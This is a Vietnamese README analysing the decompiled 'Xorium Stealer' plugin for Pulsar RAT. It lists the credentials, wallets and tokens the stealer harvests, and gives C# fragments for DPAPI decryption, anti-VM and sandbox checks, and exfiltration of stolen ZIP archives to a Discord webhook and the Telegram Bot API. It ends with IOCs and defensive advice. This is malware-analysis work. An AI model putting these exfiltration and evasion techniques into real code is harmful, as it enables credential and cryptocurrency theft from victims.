# Xorium Stealer Pulsar - Phân tích Mã độc cho Mục đích Nghiên cứu

> ⚠️ **CẢNH BÁO PHÁP LÝ**: Repository này chứa mã độc (malware) đã được decompile. Nội dung này được cung cấp **CHỈ** cho mục đích nghiên cứu, phân tích và giáo dục an ninh mạng. Việc sử dụng mã này cho mục đích bất hợp pháp là **NGHIÊM CẤM** và có thể dẫn đến truy tố hình sự.

**[🇬🇧 English Version](README_EN.md)**

---

## 📋 Tổng quan

**Xorium Stealer Pulsar** là một plugin stealer (công cụ đánh cắp dữ liệu) được thiết kế để tích hợp với **Pulsar RAT** (Remote Access Trojan) - một framework điều khiển từ xa. Plugin này được phát triển bởi `@aesxor` và có khả năng thu thập dữ liệu nhạy cảm từ máy nạn nhân.

### Thông tin kỹ thuật
- **Tên**: Xorium Stealer Pulsar
- **Phiên bản**: 2.1.0 (Client), 2.0.0 (Server)
- **Ngôn ngữ**: C# (.NET Framework 4.7.2)
- **Kiến trúc**: Plugin-based cho Pulsar RAT
- **Tác giả**: @aesxor

---

## 🏗️ Kiến trúc Hệ thống

Dự án được chia thành 2 thành phần chính:

```
Xorium Stealer Pulsar/
├── Pulsar.Plugin.Client/          # Client - Mã độc chạy trên máy nạn nhân
│   └── Stealer.Client/
│       ├── Intelix/Targets/       # Các module thu thập dữ liệu
│       └── Pulsar/Plugins/Client/ # Entry point plugin
│
└── Pulsar.Plugin.Server/          # Server - Plugin điều khiển cho Pulsar RAT
    └── Stealer.Server/
        └── Pulsar/Plugins/Server/ # Entry point server plugin
```

### Luồng hoạt động

1. **Server Plugin** (`Stealer.Server.dll`) được tải vào Pulsar RAT
2. Operator chọn client và gửi lệnh "Run Stealer"
3. Server đẩy `Stealer.Client.dll` xuống máy nạn nhân
4. Client thực thi, thu thập dữ liệu và gửi về qua:
   - Discord Webhook
   - Telegram Bot API
   - Trực tiếp về Pulsar Server

---

## 🎯 Các Mục tiêu Thu thập (Targets)

### 1. 🌐 Trình duyệt (Browsers)
| Loại | Trình duyệt được hỗ trợ |
|------|------------------------|
| **Chromium-based** | Chrome, Edge, Brave, Opera, Vivaldi, Yandex, Chromium |
| **Gecko-based** | Firefox, Waterfox, Pale Moon, SeaMonkey |

**Dữ liệu thu thập:**
- Lịch sử duyệt web
- Cookies (bao gồm session cookies)
- Saved passwords (giải mã từ DPAPI)
- Credit cards (giải mã)
- AutoFill data
- Tokens xác thực

### 2. 💬 Ứng dụng Nhắn tin (Messengers)
- **Discord** - Tokens, user data
- **Telegram** - Session files, settings
- **Signal** - Cấu hình, dữ liệu local
- **Skype** - Credentials, lịch sử
- **Viber** - Session data
- **Element (Riot.im)** - Cấu hình
- **ICQ** - User data
- **Pidgin** - Account settings
- **Tox** - Profile data
- **Outlook** - Email credentials
- **MicroSIP** - VoIP settings
- **Jabber** - IM credentials

### 3. 🎮 Nền tảng Game
| Game | Dữ liệu thu thập |
|------|-----------------|
| **Steam** | Login credentials, session files, config |
| **Epic Games** | Account data, session |
| **Battle.net** | Credentials, game configs |
| **Riot Games** (Valorant, LoL) | Session tokens |
| **Roblox** | Cookies, login data |
| **Minecraft** | Session files, credentials |
| **Uplay (Ubisoft)** | Login data |
| **Xbox** | Account credentials |
| **Growtopia** | Save data |
| **Electronic Arts** | Session, credentials |

### 4. 🔐 VPN Clients
- NordVPN, ExpressVPN, ProtonVPN
- CyberGhost, Mullvad, PIA (Private Internet Access)
- OpenVPN, WireGuard, SoftEther
- Hamachi, RadminVPN, SurfShark
- IPVanish, HideMyName, Cisco AnyConnect
- Proxifier

### 5. 💰 Ví Tiền điện tử (Crypto Wallets)

**Desktop Wallets:**
- Bitcoin Core, Electrum, Exodus
- Ethereum (keystore files)
- Atomic Wallet, Coinomi, Guarda
- Jaxx, Armory, Zcash
- Bytecoin, Dash Core
- Tari Universe

**Browser Extension Wallets:**
- MetaMask, Phantom, Trust Wallet
- Coinbase Wallet, Binance Wallet
- Ronin Wallet, Brave Wallet
- TronLink, Yoroi, Nami
- Math Wallet, XDEFI, Guarda
- Equal, BitAppWallet, iWallet
- Wombat, AtomicNFT, MewCx
- GuildWallet, Saturn, Ronin

### 6. 🖥️ Thông tin Hệ thống (Device)
- **SystemInfo** - OS version, hardware specs, username, hostname
- **ScreenShot** - Chụp màn hình desktop
- **ProcessDump** - Danh sách process đang chạy
- **ProductKey** - Windows product key
- **WifiKey** - WiFi passwords đã lưu
- **InstalledPrograms** - Danh sách phần mềm đã cài
- **InstalledBrowsers** - Danh sách trình duyệt

### 7. 🛠️ Ứng dụng Khác (Applications)

**Remote Access:**
- AnyDesk, TeamViewer, RDP
- RDCMan, Sunlogin, MobaXterm
- Xmanager, PuTTY

**FTP/SCP Clients:**
- FileZilla, WinSCP, CyberDuck
- CoreFTP, FTPNavigator, FTPRush
- FTPGetter, FTPCommander, TotalCommander

**Development/DevOps:**
- JetBrains IDEs (config, licenses)
- GitHub Desktop, Ngrok
- Navicat, No-IP, DynDNS
- OBS, TeamSpeak, PlayIt

---

## 🔧 Cơ chế Kỹ thuật

### Giải mã DPAPI (Data Protection API)
```csharp
// Trích xuất Master Key từ Local State
byte[] masterv10 = LocalState.MasterKeyV10(localstate);
byte[] masterv20 = LocalState.MasterKeyV20(localstate);
```

Mã độc sử dụng DPAPI để giải mã dữ liệu đã mã hóa của trình duyệt:
- Passwords được lưu trong `Login Data` SQLite database
- Cookies trong `Cookies` hoặc `Network/Cookies`
- Credit cards trong `Web Data`

### SQLite Database Parsing
Sử dụng custom SQLite parser để đọc dữ liệu từ các file database của trình duyệt mà không cần lock file.

### Parallel Processing
```csharp
Task.WaitAll(Task.Run(() => Parallel.ForEach<ITarget>(
    Stealer.Targets, 
    target => target.Collect(zip, counter)
)));
```

Sử dụng parallel processing để tăng tốc độ thu thập dữ liệu.

### Exfiltration (Đưa dữ liệu ra ngoài)

**Discord Webhook:**
```csharp
POST {webhookUrl}
Content-Type: multipart/form-data
- payload_json: Embed message với thông tin victim
- file: ZIP archive chứa dữ liệu đánh cắp
```

**Telegram Bot API:**
```csharp
POST https://api.telegram.org/bot{token}/sendDocument
- chat_id: {chatId}
- caption: Log metadata
- document: ZIP file
```

---

## 📊 Cấu trúc Output

Dữ liệu được đóng gói thành file ZIP với cấu trúc:

```
{Username}_{ComputerName}_{YYYYMMDD}.zip
├── Browsers/
│   ├── Chrome/
│   │   ├── Passwords.txt
│   │   ├── Cookies.txt
│   │   ├── History.txt
│   │   └── CreditCards.txt
│   └── Firefox/
│       └── ...
├── Messengers/
│   ├── Discord/
│   ├── Telegram/
│   └── ...
├── Games/
│   ├── Steam/
│   ├── Epic/
│   └── ...
├── Wallets/
│   ├── Exodus/
│   ├── Electrum/
│   └── ...
├── VPN/
│   └── ...
├── Applications/
│   └── ...
├── System/
│   ├── SystemInfo.txt
│   ├── WiFiPasswords.txt
│   ├── InstalledPrograms.txt
│   └── Screenshot.png
└── counter.txt  # Summary statistics
```

---

## 🛡️ Anti-VM & Anti-Sandbox

Mã độc sử dụng nhiều kỹ thuật để phát hiện và tránh chạy trong môi trường ảo hóa (VM) hoặc sandbox:

### Các kỹ thuật Anti-Analysis

| Kỹ thuật | Mô tả | Điều kiện phát hiện |
|----------|-------|---------------------|
| **Processor Count Check** | Kiểm tra số lượng CPU cores | `Environment.ProcessorCount <= 1` |
| **Debugger Detection** | Phát hiện debugger đang attach | `Debugger.IsAttached` |
| **Memory Check** | Kiểm tra RAM tổng | RAM < 2GB |
| **Drive Space Check** | Kiểm tra dung lượng ổ C | < 50GB |
| **Cache Memory Check** | Kiểm tra Win32_CacheMemory | Không có cache memory |
| **CIM Memory Check** | Kiểm tra CIM_Memory | Không có CIM memory |
| **Process Name Check** | Kiểm tra tên process | Chứa từ "sandbox" |
| **User/Machine Check** | Kiểm tra username và hostname | Các pattern đặc biệt |

### Các pattern User/Machine bị phát hiện

```csharp
// Windows Defender Application Guard
username == "WDAGUtilityAccount"

// Các pattern sandbox phổ biến
(username == "frank" && hostname.Contains("desktop"))
(username == "robert" && hostname.Contains("22h2"))
```

### Hành vi khi phát hiện VM/Sandbox

```csharp
public static void CheckOrExit()
{
    if (ProccessorCheck()) throw new Exception();
    if (CheckDebugger()) throw new Exception();
    if (CheckMemory()) throw new Exception();
    if (CheckDriveSpace()) throw new Exception();
    if (CheckUserConditions()) throw new Exception();
    if (CheckCache()) throw new Exception();
    if (CheckFileName()) throw new Exception();
    if (CheckCim()) throw new Exception();
}
```

Khi phát hiện bất kỳ điều kiện nào, mã độc sẽ throw exception và dừng thực thi ngay lập tức.

---

## 🛡️ Phòng chống & Phát hiện

### IOCs (Indicators of Compromise)

**File Paths:**
- `%APPDATA%\pulsar_cl_conf.bin` - Config file lưu webhook/token
- `%TEMP%\*.zip` - Temporary archive files

**Registry Keys:**
- Các key liên quan đến startup persistence

**Network Indicators:**
- Discord webhook URLs: `discord.com/api/webhooks/*`
- Telegram API: `api.telegram.org/bot*/sendDocument`

### Biện pháp Phòng ngừa

1. **Sử dụng Password Manager** - Không lưu password trong trình duyệt
2. **Tắt AutoFill** - Vô hiệu hóa tính năng điền tự động
3. **2FA/MFA** - Bật xác thực 2 yếu tố cho tất cả tài khoản
4. **Endpoint Protection** - Sử dụng EDR/AV hiện đại
5. **Application Control** - Chặn thực thi file không rõ nguồn gốc
6. **Network Monitoring** - Giám sát traffic đến Discord/Telegram APIs

---

## 🔬 Phân tích Reverse Engineering

### Công cụ Phân tích
- **JetBrains dotPeek** / **dnSpy** - Decompile .NET assemblies
- **ILSpy** - Open-source .NET decompiler
- **Detect It Easy (DIE)** - Xác định packer/compiler
- **PEStudio** - Static analysis PE files

### Anti-Analysis Techniques
- **Costura.Fody** - Nhúng dependencies vào assembly chính
- **Obfuscation** - Mã hóa string, rename symbols
- **Compressed DLLs** - Nén thư viện trong resources

---

## 📚 Tài liệu Tham khảo

### Về DPAPI
- [Microsoft DPAPI Documentation](https://docs.microsoft.com/en-us/windows/win32/seccng/cng-dpapi)
- [Chrome Password Decryption](https://www.hackingarticles.in/forensic-investigation-of-stored-password-in-chrome/)

### Về SQLite Forensics
- [Browser Forensics](https://www.sans.org/blog/browser-forensics/)
- [Chrome Forensics](https://forensicswiki.xyz/page/Google_Chrome)

### Về Pulsar RAT
- Pulsar là một Remote Access Trojan framework phổ biến trong cộng đồng cybercrime

---

## ⚖️ Disclaimer

Repository này được cung cấp cho mục đích **GIÁO DỤC VÀ NGHIÊN CỨU**:

- ✅ Phân tích malware để hiểu cách thức hoạt động
- ✅ Phát triển biện pháp phòng ngừa và phát hiện
- ✅ Đào tạo nhân viên an ninh mạng
- ✅ Nghiên cứu academic về cybersecurity

**KHÔNG ĐƯỢC:**
- ❌ Sử dụng để tấn công hệ thống không có quyền
- ❌ Phân phối với mục đích gây hại
- ❌ Sử dụng cho mục đích thương mại bất hợp pháp

---

## 👤 Tác giả Phân tích

Phân tích này được thực hiện bởi nhà phân tích mã độc độc lập cho mục đích nghiên cứu an ninh mạng.

**Ngày phân tích**: 2026-01-31  
**Phiên bản phân tích**: 1.0

---

## 📞 Liên hệ

Nếu bạn phát hiện mã độc này trong hệ thống của mình:
1. Ngắt kết nối internet ngay lập tức
2. Sử dụng công cụ antivirus để quét toàn bộ hệ thống
3. Thay đổi tất cả mật khẩu từ máy tính khác
4. Kiểm tra các ứng dụng crypto và di chuyển tài sản nếu cần
5. Liên hệ chuyên gia an ninh mạng

---

*"Hiểu kẻ thù để bảo vệ chính mình"*
